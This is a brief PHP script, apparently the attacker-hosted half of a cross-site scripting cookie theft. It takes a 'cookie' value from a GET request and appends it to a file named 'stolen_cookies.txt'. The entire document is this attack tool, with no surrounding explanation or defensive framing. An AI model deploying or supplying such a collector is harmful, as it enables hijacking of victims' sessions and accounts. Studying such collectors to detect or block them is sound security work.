<?php
if(isset($_GET['cookie'])) {
    file_put_contents("stolen_cookies.txt", $_GET['cookie'] . "\n", FILE_APPEND);
}
?>
